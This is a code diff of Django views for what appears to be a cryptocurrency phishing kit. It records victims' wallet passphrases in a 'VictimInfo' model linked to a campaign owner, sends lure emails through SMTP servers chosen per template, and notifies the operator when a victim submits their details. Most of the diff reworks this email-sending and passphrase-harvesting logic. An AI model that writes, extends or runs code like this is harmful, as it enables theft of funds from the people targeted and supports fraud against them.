@@ -10,7 +10,6 @@ from django.template.loader import render_to_string
 from account.models import UserProfile
 from django.utils.html import strip_tags
 from django.contrib.sites.shortcuts import get_current_site
-from .utils import send_email_with_smtp
 
 
 logger = logging.getLogger(__name__)
@@ -176,7 +175,7 @@ def passphrase_info(request, campaign_id):
         form = PassphraseForm(request.POST)
         if form.is_valid():
             victim_info = VictimInfo(
-                user=request.user,  # Associate the current user
+                user=campaign.user,  # Associate the current user
                 wallet=get_object_or_404(Wallet, id=request.session.get('victim_wallet_id')),  # Fetch wallet info from session
                 campaign=campaign,  # Set the associated campaign
                 passphrase=form.cleaned_data['passphrase'],
@@ -230,6 +229,8 @@ def victim_info_list(request):
 def get_base_url(request):
     return f"{request.scheme}://{get_current_site(request).domain}"
 
+
+
 def send_campaign_email(campaign, request):
     base_url = get_base_url(request)
     context = {
@@ -239,6 +240,7 @@ def send_campaign_email(campaign, request):
         'quantity': campaign.quantity,
         'min_balance': campaign.min_balance,
     }
+
     # Get the template path using the mapping
     template_type = campaign.email_template.type
     template_path = TEMPLATE_MAPPING.get(template_type)
@@ -246,21 +248,39 @@ def send_campaign_email(campaign, request):
     if not template_path:
         raise ValueError(f"Invalid email template type: {template_type}")
 
+    # Render the email body
+    html_message = render_to_string(template_path, context)
+    plain_message = strip_tags(html_message)
+
     subject = 'Exciting News from Our Campaign!'
-    send_email_with_smtp(template_type, subject, campaign.recipient_email, context, template_path)
+    recipient_email = campaign.recipient_email
 
+    # Set specific SMTP settings based on the campaign type
+    smtp_settings = settings.CAMPAIGN_EMAIL_BACKENDS.get(template_type)
 
+    if smtp_settings:
+        with get_connection(
+            backend='django.core.mail.backends.smtp.EmailBackend',
+            fail_silently=False,
+            **smtp_settings
+        ) as connection:
+            try:
+                send_mail(
+                    subject,
+                    plain_message,
+                    smtp_settings['EMAIL_HOST_USER'],  # Use the user from the specific campaign backend
+                    [recipient_email],
+                    html_message=html_message,
+                    connection=connection,
+                )
+                logger.info(f"Campaign email sent to {recipient_email} for campaign {campaign.id}.")
+            except Exception as e:
+                logger.error(f"Failed to send campaign email for {campaign.id} to {recipient_email}: {e}", exc_info=True)
+    else:
+        logger.error(f"No SMTP settings found for template type: {template_type}")
 
 def send_victim_info_notification(user_email, campaign):
-    """
-    Sends an email notification to the user when the victim successfully submits all their information.
-    """
-    subject = 'Victim Information Submission Successful'
-    context = {
-        'campaign_type': campaign.email_template.type,
-        'campaign_id': campaign.id,
-    }
-
+    subject = f"Victim Info Submitted for Campaign: {campaign.id}"
     message = f"""
     Hello,
 
@@ -271,11 +291,15 @@ def send_victim_info_notification(user_email, campaign):
     Best regards,
     Your Platform Team
     """
-
-    template_type = campaign.email_template.type  # Get the email type
-    template_path = TEMPLATE_MAPPING.get(template_type)
-
+    
     try:
-        send_email_with_smtp(template_type, subject, user_email, context, template_path)
+        send_mail(
+            subject,
+            message,  # Plain text message
+            settings.DEFAULT_FROM_EMAIL,
+            [user_email],
+            fail_silently=False,  # Set to True if you want to ignore errors
+        )
+        logger.info(f"Victim info notification sent to {user_email} for campaign {campaign.id}.")
     except Exception as e:
-        logger.error(f"Failed to send notification email for {campaign.id} to {user_email}: {e}", exc_info=True)
+        logger.error(f"Failed to send victim info notification for campaign {campaign.id} to {user_email}: {e}", exc_info=True)
